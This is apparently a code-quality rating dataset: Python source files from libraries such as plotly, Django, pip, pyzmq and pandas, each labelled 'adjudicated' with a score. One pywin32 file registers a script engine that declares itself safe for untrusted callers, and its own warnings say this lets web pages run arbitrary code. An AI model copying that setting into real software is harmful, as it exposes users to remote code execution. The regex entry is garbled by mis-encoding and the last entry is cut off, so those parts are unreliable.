16	adjudicated	3	"# Copyright 2015 Google Inc. All rights reserved.<<NEWL>>#<<NEWL>># Licensed under the Apache License, Version 2.0 (the ""License"");<<NEWL>># you may not use this file except in compliance with the License.<<NEWL>># You may obtain a copy of the License at<<NEWL>>#<<NEWL>># http://www.apache.org/licenses/LICENSE-2.0<<NEWL>>#<<NEWL>># Unless required by applicable law or agreed to in writing, software<<NEWL>># distributed under the License is distributed on an ""AS IS"" BASIS,<<NEWL>># WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.<<NEWL>># See the License for the specific language governing permissions and<<NEWL>># limitations under the License.<<NEWL>><<NEWL>>""""""<<NEWL>>Sample App Engine application demonstrating how to use the Namespace Manager<<NEWL>>API with Memcache.<<NEWL>><<NEWL>>For more information, see README.md.<<NEWL>>""""""<<NEWL>><<NEWL>># [START all]<<NEWL>>from google.appengine.api import memcache<<NEWL>>from google.appengine.api import namespace_manager<<NEWL>>import webapp2<<NEWL>><<NEWL>><<NEWL>>class MemcacheCounterHandler(webapp2.RequestHandler):<<NEWL>>    """"""Increments counters in the global namespace as well as in whichever<<NEWL>>    namespace is specified by the request, which is arbitrarily named 'default'<<NEWL>>    if not specified.""""""<<NEWL>><<NEWL>>    def get(self, namespace='default'):<<NEWL>>        global_count = memcache.incr('counter', initial_value=0)<<NEWL>><<NEWL>>        # Save the current namespace.<<NEWL>>        previous_namespace = namespace_manager.get_namespace()<<NEWL>>        try:<<NEWL>>            namespace_manager.set_namespace(namespace)<<NEWL>>            namespace_count = memcache.incr('counter', initial_value=0)<<NEWL>>        finally:<<NEWL>>            # Restore the saved namespace.<<NEWL>>            namespace_manager.set_namespace(previous_namespace)<<NEWL>><<NEWL>>        self.response.write('Global: {}, Namespace {}: {}'.format(<<NEWL>>            global_count, namespace, namespace_count))<<NEWL>><<NEWL>><<NEWL>>app = webapp2.WSGIApplication([<<NEWL>>    (r'/memcache', MemcacheCounterHandler),<<NEWL>>    (r'/memcache/(.*)', MemcacheCounterHandler)<<NEWL>>], debug=True)<<NEWL>># [END all]"
296	adjudicated	2	"import _plotly_utils.basevalidators<<NEWL>><<NEWL>><<NEWL>>class HoverlabelValidator(_plotly_utils.basevalidators.CompoundValidator):<<NEWL>>    def __init__(<<NEWL>>        self, plotly_name=""hoverlabel"", parent_name=""scatterternary"", **kwargs<<NEWL>>    ):<<NEWL>>        super(HoverlabelValidator, self).__init__(<<NEWL>>            plotly_name=plotly_name,<<NEWL>>            parent_name=parent_name,<<NEWL>>            data_class_str=kwargs.pop(""data_class_str"", ""Hoverlabel""),<<NEWL>>            data_docs=kwargs.pop(<<NEWL>>                ""data_docs"",<<NEWL>>                """"""<<NEWL>>            align<<NEWL>>                Sets the horizontal alignment of the text<<NEWL>>                content within hover label box. Has an effect<<NEWL>>                only if the hover label text spans more two or<<NEWL>>                more lines<<NEWL>>            alignsrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `align`.<<NEWL>>            bgcolor<<NEWL>>                Sets the background color of the hover labels<<NEWL>>                for this trace<<NEWL>>            bgcolorsrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `bgcolor`.<<NEWL>>            bordercolor<<NEWL>>                Sets the border color of the hover labels for<<NEWL>>                this trace.<<NEWL>>            bordercolorsrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `bordercolor`.<<NEWL>>            font<<NEWL>>                Sets the font used in hover labels.<<NEWL>>            namelength<<NEWL>>                Sets the default length (in number of<<NEWL>>                characters) of the trace name in the hover<<NEWL>>                labels for all traces. -1 shows the whole name<<NEWL>>                regardless of length. 0-3 shows the first 0-3<<NEWL>>                characters, and an integer >3 will show the<<NEWL>>                whole name if it is less than that many<<NEWL>>                characters, but if it is longer, will truncate<<NEWL>>                to `namelength - 3` characters and add an<<NEWL>>                ellipsis.<<NEWL>>            namelengthsrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `namelength`.<<NEWL>>"""""",<<NEWL>>            ),<<NEWL>>            **kwargs,<<NEWL>>        )"
107	adjudicated	2	"import json<<NEWL>><<NEWL>>from django.core.serializers.json import DjangoJSONEncoder<<NEWL>>from django.http import HttpResponse<<NEWL>>try:<<NEWL>>    from django.utils.encoding import force_unicode as force_text  # Django < 1.5<<NEWL>>except ImportError as e:<<NEWL>>    from django.utils.encoding import force_text  # Django 1.5 / python3<<NEWL>>from django.utils.functional import Promise<<NEWL>>from django.utils.cache import add_never_cache_headers<<NEWL>>from django.views.generic.base import TemplateView<<NEWL>><<NEWL>>import logging<<NEWL>>logger = logging.getLogger(__name__)<<NEWL>><<NEWL>><<NEWL>>class LazyEncoder(DjangoJSONEncoder):<<NEWL>>    """"""Encodes django's lazy i18n strings<<NEWL>>    """"""<<NEWL>>    def default(self, obj):<<NEWL>>        if isinstance(obj, Promise):<<NEWL>>            return force_text(obj)<<NEWL>>        return super(LazyEncoder, self).default(obj)<<NEWL>><<NEWL>><<NEWL>>class JSONResponseMixin(object):<<NEWL>>    is_clean = False<<NEWL>><<NEWL>>    def render_to_response(self, context):<<NEWL>>        """""" Returns a JSON response containing 'context' as payload<<NEWL>>        """"""<<NEWL>>        return self.get_json_response(context)<<NEWL>><<NEWL>>    def get_json_response(self, content, **httpresponse_kwargs):<<NEWL>>        """""" Construct an `HttpResponse` object.<<NEWL>>        """"""<<NEWL>>        response = HttpResponse(content,<<NEWL>>                                content_type='application/json',<<NEWL>>                                **httpresponse_kwargs)<<NEWL>>        add_never_cache_headers(response)<<NEWL>>        return response<<NEWL>><<NEWL>>    def post(self, *args, **kwargs):<<NEWL>>        return self.get(*args, **kwargs)<<NEWL>><<NEWL>>    def get(self, request, *args, **kwargs):<<NEWL>>        self.request = request<<NEWL>>        response = None<<NEWL>><<NEWL>>        func_val = self.get_context_data(**kwargs)<<NEWL>>        if not self.is_clean:<<NEWL>>            assert isinstance(func_val, dict)<<NEWL>>            response = dict(func_val)<<NEWL>>            if 'error' not in response and 'sError' not in response:<<NEWL>>                response['result'] = 'ok'<<NEWL>>            else:<<NEWL>>                response['result'] = 'error'<<NEWL>>        else:<<NEWL>>            response = func_val<<NEWL>><<NEWL>>        dump = json.dumps(response, cls=LazyEncoder)<<NEWL>>        return self.render_to_response(dump)<<NEWL>><<NEWL>><<NEWL>>class JSONResponseView(JSONResponseMixin, TemplateView):<<NEWL>>    pass"
47	adjudicated	3	"import re<<NEWL>><<NEWL>># generated by scripts/generate_identifier_pattern.py<<NEWL>>pattern = re.compile(<<NEWL>>    r""[\wÂ·Ì-Í¯ÎÒ-ÒÖ-Ö½Ö¿×××××Ø-ØÙ-ÙÙ°Û-ÛÛ-Û¤Û§Û¨Ûª-Û­ÜÜ°-ÝÞ¦-Þ°ß«-ß³à -à à -à £à ¥-à §à ©-à ­à¡-à¡à£-à£¡à££-à¤à¤º-à¤¼à¤¾-à¥à¥-à¥à¥¢à¥£à¦-à¦à¦¼à¦¾-à§à§à§à§-à§à§à§¢à§£à¨-à¨à¨¼à¨¾-à©à©à©à©-à©à©à©°à©±à©µàª-àªàª¼àª¾-à«à«-à«à«-à«à«¢à«£à¬-à¬à¬¼à¬¾-à­à­à­à­-à­à­à­à­¢à­£à®à®¾-à¯à¯-à¯à¯-à¯à¯à°-à°à°¾-à±à±-à±à±-à±à±à±à±¢à±£à²-à²à²¼à²¾-à³à³-à³à³-à³à³à³à³¢à³£à´-à´à´¾-àµàµ-àµàµ-àµàµàµ¢àµ£à¶à¶à·à·-à·à·à·-à·à·²à·³à¸±à¸´-à¸ºà¹-à¹àº±àº´-àº¹àº»àº¼à»-à»à¼à¼à¼µà¼·à¼¹à¼¾à¼¿à½±-à¾à¾à¾à¾-à¾à¾-à¾¼à¿á«-á¾á-áá-á á¢-á¤á§-á­á±-á´á-ááá-áá-áá-áá²-á´ááá²á³á´-ááá -á á¢á¢á¢©á¤ -á¤«á¤°-á¤»á¨-á¨á©-á©á© -á©¼á©¿áª°-áª½á¬-á¬á¬´-á­á­«-á­³á®-á®á®¡-á®­á¯¦-á¯³á°¤-á°·á³-á³á³-á³¨á³­á³²-á³´á³¸á³¹á·-á·µá·»-á·¿â¿âââ-ââ¡â¥-â°ââ®â³¯-â³±âµ¿â· -â·¿ãª-ã¯ããê¯ê´-ê½êêê°ê±ê ê ê ê £-ê §ê¢ê¢ê¢´-ê£ê£ -ê£±ê¤¦-ê¤­ê¥-ê¥ê¦-ê¦ê¦³-ê§ê§¥ê¨©-ê¨¶ê©ê©ê©ê©»-ê©½êª°êª²-êª´êª·êª¸êª¾êª¿ê«ê««-ê«¯ê«µê«¶ê¯£-ê¯ªê¯¬ê¯­ï¬ï¸-ï¸ï¸ -ï¸¯ï¸³ï¸´ï¹-ï¹ï¼¿ð½ð ð¶-ðºð¨-ð¨ð¨ð¨ð¨-ð¨ð¨¸-ð¨ºð¨¿ð«¥ð«¦ð-ðð¸-ðð¿-ðð°-ðºð-ðð§-ð´ð³ð-ðð³-ðð-ðð¬-ð·ð¾ð-ðªð-ðð¼ð¾-ðððð-ððð¢ð£ð¦-ð¬ð°-ð´ðµ-ðð°-ðð¯-ðµð¸-ðððð°-ðð«-ð·ð-ð«ð°¯-ð°¶ð°¸-ð°¿ð²-ð²§ð²©-ð²¶ð«°-ð«´ð¬°-ð¬¶ð½-ð½¾ð¾-ð¾ð²ð²ð¥-ð©ð­-ð²ð»-ðð-ððª-ð­ð-ðð¨-ð¨¶ð¨»-ð©¬ð©µðªðª-ðªðª¡-ðª¯ð-ðð-ðð-ð¡ð£ð¤ð¦-ðªð£-ð£ð¥-ð¥ó -ó ¯]+""  # noqa: B950<<NEWL>>)"
265	adjudicated	0	"# Copyright 2019 Google, LLC.<<NEWL>>#<<NEWL>># Licensed under the Apache License, Version 2.0 (the ""License"");<<NEWL>># you may not use this file except in compliance with the License.<<NEWL>># You may obtain a copy of the License at<<NEWL>>#<<NEWL>>#    http://www.apache.org/licenses/LICENSE-2.0<<NEWL>>#<<NEWL>># Unless required by applicable law or agreed to in writing, software<<NEWL>># distributed under the License is distributed on an ""AS IS"" BASIS,<<NEWL>># WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.<<NEWL>># See the License for the specific language governing permissions and<<NEWL>># limitations under the License.<<NEWL>><<NEWL>># NOTE:<<NEWL>># These tests are unit tests that mock Pub/Sub.<<NEWL>>import base64<<NEWL>>import json<<NEWL>>import uuid<<NEWL>><<NEWL>>import mock<<NEWL>>import pytest<<NEWL>><<NEWL>>import main<<NEWL>><<NEWL>><<NEWL>>@pytest.fixture<<NEWL>>def client():<<NEWL>>    main.app.testing = True<<NEWL>>    return main.app.test_client()<<NEWL>><<NEWL>><<NEWL>>def test_empty_payload(client):<<NEWL>>    r = client.post(""/"", json="""")<<NEWL>>    assert r.status_code == 400<<NEWL>><<NEWL>><<NEWL>>def test_invalid_payload(client):<<NEWL>>    r = client.post(""/"", json={""nomessage"": ""invalid""})<<NEWL>>    assert r.status_code == 400<<NEWL>><<NEWL>><<NEWL>>def test_invalid_mimetype(client):<<NEWL>>    r = client.post(""/"", json=""{ message: true }"")<<NEWL>>    assert r.status_code == 400<<NEWL>><<NEWL>><<NEWL>>@mock.patch(""image.blur_offensive_images"", mock.MagicMock(return_value=204))<<NEWL>>def test_minimally_valid_message(client):<<NEWL>>    data_json = json.dumps({""name"": True, ""bucket"": True})<<NEWL>>    data = base64.b64encode(data_json.encode()).decode()<<NEWL>><<NEWL>>    r = client.post(""/"", json={""message"": {""data"": data}})<<NEWL>>    assert r.status_code == 204<<NEWL>><<NEWL>><<NEWL>>def test_call_to_blur_image(client, capsys):<<NEWL>>    filename = str(uuid.uuid4())<<NEWL>>    blur_bucket = ""blurred-bucket-"" + str(uuid.uuid4())<<NEWL>><<NEWL>>    data_json = json.dumps({""name"": filename, ""bucket"": blur_bucket})<<NEWL>>    data = base64.b64encode(data_json.encode()).decode()<<NEWL>><<NEWL>>    r = client.post(""/"", json={""message"": {""data"": data}})<<NEWL>>    assert r.status_code == 204<<NEWL>><<NEWL>>    out, _ = capsys.readouterr()<<NEWL>>    assert f""The image {filename} was detected as OK"" in out"
325	adjudicated	1	"import pytest<<NEWL>><<NEWL>>import pandas as pd<<NEWL>>import pandas._testing as tm<<NEWL>><<NEWL>><<NEWL>>class TestDatetimeIndexFillNA:<<NEWL>>    @pytest.mark.parametrize(""tz"", [""US/Eastern"", ""Asia/Tokyo""])<<NEWL>>    def test_fillna_datetime64(self, tz):<<NEWL>>        # GH 11343<<NEWL>>        idx = pd.DatetimeIndex([""2011-01-01 09:00"", pd.NaT, ""2011-01-01 11:00""])<<NEWL>><<NEWL>>        exp = pd.DatetimeIndex(<<NEWL>>            [""2011-01-01 09:00"", ""2011-01-01 10:00"", ""2011-01-01 11:00""]<<NEWL>>        )<<NEWL>>        tm.assert_index_equal(idx.fillna(pd.Timestamp(""2011-01-01 10:00"")), exp)<<NEWL>><<NEWL>>        # tz mismatch<<NEWL>>        exp = pd.Index(<<NEWL>>            [<<NEWL>>                pd.Timestamp(""2011-01-01 09:00""),<<NEWL>>                pd.Timestamp(""2011-01-01 10:00"", tz=tz),<<NEWL>>                pd.Timestamp(""2011-01-01 11:00""),<<NEWL>>            ],<<NEWL>>            dtype=object,<<NEWL>>        )<<NEWL>>        tm.assert_index_equal(idx.fillna(pd.Timestamp(""2011-01-01 10:00"", tz=tz)), exp)<<NEWL>><<NEWL>>        # object<<NEWL>>        exp = pd.Index(<<NEWL>>            [pd.Timestamp(""2011-01-01 09:00""), ""x"", pd.Timestamp(""2011-01-01 11:00"")],<<NEWL>>            dtype=object,<<NEWL>>        )<<NEWL>>        tm.assert_index_equal(idx.fillna(""x""), exp)<<NEWL>><<NEWL>>        idx = pd.DatetimeIndex([""2011-01-01 09:00"", pd.NaT, ""2011-01-01 11:00""], tz=tz)<<NEWL>><<NEWL>>        exp = pd.DatetimeIndex(<<NEWL>>            [""2011-01-01 09:00"", ""2011-01-01 10:00"", ""2011-01-01 11:00""], tz=tz<<NEWL>>        )<<NEWL>>        tm.assert_index_equal(idx.fillna(pd.Timestamp(""2011-01-01 10:00"", tz=tz)), exp)<<NEWL>><<NEWL>>        exp = pd.Index(<<NEWL>>            [<<NEWL>>                pd.Timestamp(""2011-01-01 09:00"", tz=tz),<<NEWL>>                pd.Timestamp(""2011-01-01 10:00""),<<NEWL>>                pd.Timestamp(""2011-01-01 11:00"", tz=tz),<<NEWL>>            ],<<NEWL>>            dtype=object,<<NEWL>>        )<<NEWL>>        tm.assert_index_equal(idx.fillna(pd.Timestamp(""2011-01-01 10:00"")), exp)<<NEWL>><<NEWL>>        # object<<NEWL>>        exp = pd.Index(<<NEWL>>            [<<NEWL>>                pd.Timestamp(""2011-01-01 09:00"", tz=tz),<<NEWL>>                ""x"",<<NEWL>>                pd.Timestamp(""2011-01-01 11:00"", tz=tz),<<NEWL>>            ],<<NEWL>>            dtype=object,<<NEWL>>        )<<NEWL>>        tm.assert_index_equal(idx.fillna(""x""), exp)"
234	adjudicated	0	"import string<<NEWL>><<NEWL>>from django.core.exceptions import ImproperlyConfigured<<NEWL>>from django.template import Origin, TemplateDoesNotExist<<NEWL>>from django.utils.html import conditional_escape<<NEWL>><<NEWL>>from .base import BaseEngine<<NEWL>>from .utils import csrf_input_lazy, csrf_token_lazy<<NEWL>><<NEWL>><<NEWL>>class TemplateStrings(BaseEngine):<<NEWL>>    app_dirname = ""template_strings""<<NEWL>><<NEWL>>    def __init__(self, params):<<NEWL>>        params = params.copy()<<NEWL>>        options = params.pop(""OPTIONS"").copy()<<NEWL>>        if options:<<NEWL>>            raise ImproperlyConfigured(""Unknown options: {}"".format("", "".join(options)))<<NEWL>>        super().__init__(params)<<NEWL>><<NEWL>>    def from_string(self, template_code):<<NEWL>>        return Template(template_code)<<NEWL>><<NEWL>>    def get_template(self, template_name):<<NEWL>>        tried = []<<NEWL>>        for template_file in self.iter_template_filenames(template_name):<<NEWL>>            try:<<NEWL>>                with open(template_file, encoding=""utf-8"") as fp:<<NEWL>>                    template_code = fp.read()<<NEWL>>            except FileNotFoundError:<<NEWL>>                tried.append(<<NEWL>>                    (<<NEWL>>                        Origin(template_file, template_name, self),<<NEWL>>                        ""Source does not exist"",<<NEWL>>                    )<<NEWL>>                )<<NEWL>>            else:<<NEWL>>                return Template(template_code)<<NEWL>>        raise TemplateDoesNotExist(template_name, tried=tried, backend=self)<<NEWL>><<NEWL>><<NEWL>>class Template(string.Template):<<NEWL>>    def render(self, context=None, request=None):<<NEWL>>        if context is None:<<NEWL>>            context = {}<<NEWL>>        else:<<NEWL>>            context = {k: conditional_escape(v) for k, v in context.items()}<<NEWL>>        if request is not None:<<NEWL>>            context[""csrf_input""] = csrf_input_lazy(request)<<NEWL>>            context[""csrf_token""] = csrf_token_lazy(request)<<NEWL>>        return self.safe_substitute(context)"
374	adjudicated	2	"# A version of the ActiveScripting engine that enables rexec support<<NEWL>># This version supports hosting by IE - however, due to Python's<<NEWL>># rexec module being neither completely trusted nor private, it is<<NEWL>># *not* enabled by default.<<NEWL>># As of Python 2.2, rexec is simply not available - thus, if you use this,<<NEWL>># a HTML page can do almost *anything* at all on your machine.<<NEWL>><<NEWL>># You almost certainly do NOT want to use thus!<<NEWL>><<NEWL>>import pythoncom<<NEWL>>from win32com.axscript import axscript<<NEWL>>import winerror<<NEWL>>from . import pyscript<<NEWL>><<NEWL>>INTERFACE_USES_DISPEX = 0x00000004  # Object knows to use IDispatchEx<<NEWL>>INTERFACE_USES_SECURITY_MANAGER = (<<NEWL>>    0x00000008  # Object knows to use IInternetHostSecurityManager<<NEWL>>)<<NEWL>><<NEWL>><<NEWL>>class PyScriptRExec(pyscript.PyScript):<<NEWL>>    # Setup the auto-registration stuff...<<NEWL>>    _reg_verprogid_ = ""Python.AXScript-rexec.2""<<NEWL>>    _reg_progid_ = ""Python""  # Same ProgID as the standard engine.<<NEWL>>    # <<TAB>>_reg_policy_spec_ = default<<NEWL>>    _reg_catids_ = [axscript.CATID_ActiveScript, axscript.CATID_ActiveScriptParse]<<NEWL>>    _reg_desc_ = ""Python ActiveX Scripting Engine (with rexec support)""<<NEWL>>    _reg_clsid_ = ""{69c2454b-efa2-455b-988c-c3651c4a2f69}""<<NEWL>>    _reg_class_spec_ = ""win32com.axscript.client.pyscript_rexec.PyScriptRExec""<<NEWL>>    _reg_remove_keys_ = [("".pys"",), (""pysFile"",)]<<NEWL>>    _reg_threading_ = ""Apartment""<<NEWL>><<NEWL>>    def _GetSupportedInterfaceSafetyOptions(self):<<NEWL>>        # print ""**** calling"", pyscript.PyScript._GetSupportedInterfaceSafetyOptions, ""**->"", pyscript.PyScript._GetSupportedInterfaceSafetyOptions(self)<<NEWL>>        return (<<NEWL>>            INTERFACE_USES_DISPEX<<NEWL>>            | INTERFACE_USES_SECURITY_MANAGER<<NEWL>>            | axscript.INTERFACESAFE_FOR_UNTRUSTED_DATA<<NEWL>>            | axscript.INTERFACESAFE_FOR_UNTRUSTED_CALLER<<NEWL>>        )<<NEWL>><<NEWL>><<NEWL>>if __name__ == ""__main__"":<<NEWL>>    print(""WARNING: By registering this engine, you are giving remote HTML code"")<<NEWL>>    print(""the ability to execute *any* code on your system."")<<NEWL>>    print()<<NEWL>>    print(""You almost certainly do NOT want to do this."")<<NEWL>>    print(""You have been warned, and are doing this at your own (significant) risk"")<<NEWL>>    pyscript.Register(PyScriptRExec)"
73	adjudicated	3	"""""""HTTP cache implementation.<<NEWL>>""""""<<NEWL>><<NEWL>>import os<<NEWL>>from contextlib import contextmanager<<NEWL>>from typing import Iterator, Optional<<NEWL>><<NEWL>>from pip._vendor.cachecontrol.cache import BaseCache<<NEWL>>from pip._vendor.cachecontrol.caches import FileCache<<NEWL>>from pip._vendor.requests.models import Response<<NEWL>><<NEWL>>from pip._internal.utils.filesystem import adjacent_tmp_file, replace<<NEWL>>from pip._internal.utils.misc import ensure_dir<<NEWL>><<NEWL>><<NEWL>>def is_from_cache(response: Response) -> bool:<<NEWL>>    return getattr(response, ""from_cache"", False)<<NEWL>><<NEWL>><<NEWL>>@contextmanager<<NEWL>>def suppressed_cache_errors() -> Iterator[None]:<<NEWL>>    """"""If we can't access the cache then we can just skip caching and process<<NEWL>>    requests as if caching wasn't enabled.<<NEWL>>    """"""<<NEWL>>    try:<<NEWL>>        yield<<NEWL>>    except OSError:<<NEWL>>        pass<<NEWL>><<NEWL>><<NEWL>>class SafeFileCache(BaseCache):<<NEWL>>    """"""<<NEWL>>    A file based cache which is safe to use even when the target directory may<<NEWL>>    not be accessible or writable.<<NEWL>>    """"""<<NEWL>><<NEWL>>    def __init__(self, directory: str) -> None:<<NEWL>>        assert directory is not None, ""Cache directory must not be None.""<<NEWL>>        super().__init__()<<NEWL>>        self.directory = directory<<NEWL>><<NEWL>>    def _get_cache_path(self, name: str) -> str:<<NEWL>>        # From cachecontrol.caches.file_cache.FileCache._fn, brought into our<<NEWL>>        # class for backwards-compatibility and to avoid using a non-public<<NEWL>>        # method.<<NEWL>>        hashed = FileCache.encode(name)<<NEWL>>        parts = list(hashed[:5]) + [hashed]<<NEWL>>        return os.path.join(self.directory, *parts)<<NEWL>><<NEWL>>    def get(self, key: str) -> Optional[bytes]:<<NEWL>>        path = self._get_cache_path(key)<<NEWL>>        with suppressed_cache_errors():<<NEWL>>            with open(path, ""rb"") as f:<<NEWL>>                return f.read()<<NEWL>><<NEWL>>    def set(self, key: str, value: bytes) -> None:<<NEWL>>        path = self._get_cache_path(key)<<NEWL>>        with suppressed_cache_errors():<<NEWL>>            ensure_dir(os.path.dirname(path))<<NEWL>><<NEWL>>            with adjacent_tmp_file(path) as f:<<NEWL>>                f.write(value)<<NEWL>><<NEWL>>            replace(f.name, path)<<NEWL>><<NEWL>>    def delete(self, key: str) -> None:<<NEWL>>        path = self._get_cache_path(key)<<NEWL>>        with suppressed_cache_errors():<<NEWL>>            os.remove(path)"
133	adjudicated	1	"""""""zmq Context class""""""<<NEWL>><<NEWL>># Copyright (C) PyZMQ Developers<<NEWL>># Distributed under the terms of the Modified BSD License.<<NEWL>><<NEWL>>from zmq.constants import EINVAL, IO_THREADS<<NEWL>>from zmq.error import InterruptedSystemCall, ZMQError, _check_rc<<NEWL>><<NEWL>>from ._cffi import ffi<<NEWL>>from ._cffi import lib as C<<NEWL>><<NEWL>><<NEWL>>class Context:<<NEWL>>    _zmq_ctx = None<<NEWL>>    _iothreads = None<<NEWL>>    _closed = True<<NEWL>>    _shadow = False<<NEWL>><<NEWL>>    def __init__(self, io_threads=1, shadow=None):<<NEWL>><<NEWL>>        if shadow:<<NEWL>>            self._zmq_ctx = ffi.cast(""void *"", shadow)<<NEWL>>            self._shadow = True<<NEWL>>        else:<<NEWL>>            self._shadow = False<<NEWL>>            if not io_threads >= 0:<<NEWL>>                raise ZMQError(EINVAL)<<NEWL>><<NEWL>>            self._zmq_ctx = C.zmq_ctx_new()<<NEWL>>        if self._zmq_ctx == ffi.NULL:<<NEWL>>            raise ZMQError(C.zmq_errno())<<NEWL>>        if not shadow:<<NEWL>>            C.zmq_ctx_set(self._zmq_ctx, IO_THREADS, io_threads)<<NEWL>>        self._closed = False<<NEWL>><<NEWL>>    @property<<NEWL>>    def underlying(self):<<NEWL>>        """"""The address of the underlying libzmq context""""""<<NEWL>>        return int(ffi.cast('size_t', self._zmq_ctx))<<NEWL>><<NEWL>>    @property<<NEWL>>    def closed(self):<<NEWL>>        return self._closed<<NEWL>><<NEWL>>    def set(self, option, value):<<NEWL>>        """"""set a context option<<NEWL>><<NEWL>>        see zmq_ctx_set<<NEWL>>        """"""<<NEWL>>        rc = C.zmq_ctx_set(self._zmq_ctx, option, value)<<NEWL>>        _check_rc(rc)<<NEWL>><<NEWL>>    def get(self, option):<<NEWL>>        """"""get context option<<NEWL>><<NEWL>>        see zmq_ctx_get<<NEWL>>        """"""<<NEWL>>        rc = C.zmq_ctx_get(self._zmq_ctx, option)<<NEWL>>        _check_rc(rc, error_without_errno=False)<<NEWL>>        return rc<<NEWL>><<NEWL>>    def term(self):<<NEWL>>        if self.closed:<<NEWL>>            return<<NEWL>><<NEWL>>        rc = C.zmq_ctx_destroy(self._zmq_ctx)<<NEWL>>        try:<<NEWL>>            _check_rc(rc)<<NEWL>>        except InterruptedSystemCall:<<NEWL>>            # ignore interrupted term<<NEWL>>            # see PEP 475 notes about close & EINTR for why<<NEWL>>            pass<<NEWL>><<NEWL>>        self._zmq_ctx = None<<NEWL>>        self._closed = True<<NEWL>><<NEWL>><<NEWL>>__all__ = ['Context']"
22	adjudicated	0	"# Copyright (c) Meta Platforms, Inc. and affiliates.<<NEWL>>#<<NEWL>># This source code is licensed under the MIT license found in the<<NEWL>># LICENSE file in the root directory of this source tree.<<NEWL>># pyre-unsafe<<NEWL>><<NEWL>>from typing import Any, Iterable, Mapping, Sequence<<NEWL>><<NEWL>>from viktor._vendor.libcst._parser.base_parser import BaseParser<<NEWL>>from viktor._vendor.libcst._parser.grammar import get_nonterminal_conversions, get_terminal_conversions<<NEWL>>from viktor._vendor.libcst._parser.parso.pgen2.generator import Grammar<<NEWL>>from viktor._vendor.libcst._parser.parso.python.token import TokenType<<NEWL>>from viktor._vendor.libcst._parser.types.config import ParserConfig<<NEWL>>from viktor._vendor.libcst._parser.types.conversions import NonterminalConversion, TerminalConversion<<NEWL>>from viktor._vendor.libcst._parser.types.token import Token<<NEWL>><<NEWL>><<NEWL>>class PythonCSTParser(BaseParser[Token, TokenType, Any]):<<NEWL>>    config: ParserConfig<<NEWL>>    terminal_conversions: Mapping[str, TerminalConversion]<<NEWL>>    nonterminal_conversions: Mapping[str, NonterminalConversion]<<NEWL>><<NEWL>>    def __init__(<<NEWL>>        self,<<NEWL>>        *,<<NEWL>>        tokens: Iterable[Token],<<NEWL>>        config: ParserConfig,<<NEWL>>        pgen_grammar: ""Grammar[TokenType]"",<<NEWL>>        start_nonterminal: str = ""file_input"",<<NEWL>>    ) -> None:<<NEWL>>        super().__init__(<<NEWL>>            tokens=tokens,<<NEWL>>            lines=config.lines,<<NEWL>>            pgen_grammar=pgen_grammar,<<NEWL>>            start_nonterminal=start_nonterminal,<<NEWL>>        )<<NEWL>>        self.config = config<<NEWL>>        self.terminal_conversions = get_terminal_conversions()<<NEWL>>        self.nonterminal_conversions = get_nonterminal_conversions(<<NEWL>>            config.version, config.future_imports<<NEWL>>        )<<NEWL>><<NEWL>>    def convert_nonterminal(self, nonterminal: str, children: Sequence[Any]) -> Any:<<NEWL>>        return self.nonterminal_conversions[nonterminal](self.config, children)<<NEWL>><<NEWL>>    def convert_terminal(self, token: Token) -> Any:<<NEWL>>        return self.terminal_conversions[token.type.name](self.config, token)"
162	adjudicated	2	"import _plotly_utils.basevalidators<<NEWL>><<NEWL>><<NEWL>>class FontValidator(_plotly_utils.basevalidators.CompoundValidator):<<NEWL>>    def __init__(<<NEWL>>        self, plotly_name=""font"", parent_name=""choroplethmapbox.hoverlabel"", **kwargs<<NEWL>>    ):<<NEWL>>        super(FontValidator, self).__init__(<<NEWL>>            plotly_name=plotly_name,<<NEWL>>            parent_name=parent_name,<<NEWL>>            data_class_str=kwargs.pop(""data_class_str"", ""Font""),<<NEWL>>            data_docs=kwargs.pop(<<NEWL>>                ""data_docs"",<<NEWL>>                """"""<<NEWL>>            color<<NEWL>><<NEWL>>            colorsrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `color`.<<NEWL>>            family<<NEWL>>                HTML font family - the typeface that will be<<NEWL>>                applied by the web browser. The web browser<<NEWL>>                will only be able to apply a font if it is<<NEWL>>                available on the system which it operates.<<NEWL>>                Provide multiple font families, separated by<<NEWL>>                commas, to indicate the preference in which to<<NEWL>>                apply fonts if they aren't available on the<<NEWL>>                system. The Chart Studio Cloud (at<<NEWL>>                https://chart-studio.plotly.com or on-premise)<<NEWL>>                generates images on a server, where only a<<NEWL>>                select number of fonts are installed and<<NEWL>>                supported. These include ""Arial"", ""Balto"",<<NEWL>>                ""Courier New"", ""Droid Sans"",, ""Droid Serif"",<<NEWL>>                ""Droid Sans Mono"", ""Gravitas One"", ""Old<<NEWL>>                Standard TT"", ""Open Sans"", ""Overpass"", ""PT Sans<<NEWL>>                Narrow"", ""Raleway"", ""Times New Roman"".<<NEWL>>            familysrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `family`.<<NEWL>>            size<<NEWL>><<NEWL>>            sizesrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `size`.<<NEWL>>"""""",<<NEWL>>            ),<<NEWL>>            **kwargs,<<NEWL>>        )"
340	adjudicated	2	# Copyright 2020 Google LLC<<NEWL>>#<<NEWL>># Licensed under the Apache License, Version 2.0 (the 'License');<<NEWL>># you may not use this file except in compliance with the License.<<NEWL>># You may obtain a copy of the License at<<NEWL>>#<<NEWL>>#     http://www.apache.org/licenses/LICENSE-2.0<<NEWL>>#<<NEWL>># Unless required by applicable law or agreed to in writing, software<<NEWL>># distributed under the License is distributed on an 'AS IS' BASIS,<<NEWL>># WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.<<NEWL>># See the License for the specific language governing permissions and<<NEWL>># limitations under the License.<<NEWL>><<NEWL>># [START functions_pubsub_integration_test]<<NEWL>>import base64<<NEWL>>import os<<NEWL>>import subprocess<<NEWL>>import uuid<<NEWL>><<NEWL>>import requests<<NEWL>>from requests.packages.urllib3.util.retry import Retry<<NEWL>><<NEWL>><<NEWL>>def test_print_name():<<NEWL>>    name = str(uuid.uuid4())<<NEWL>>    port = 8088  # Each running framework instance needs a unique port<<NEWL>><<NEWL>>    encoded_name = 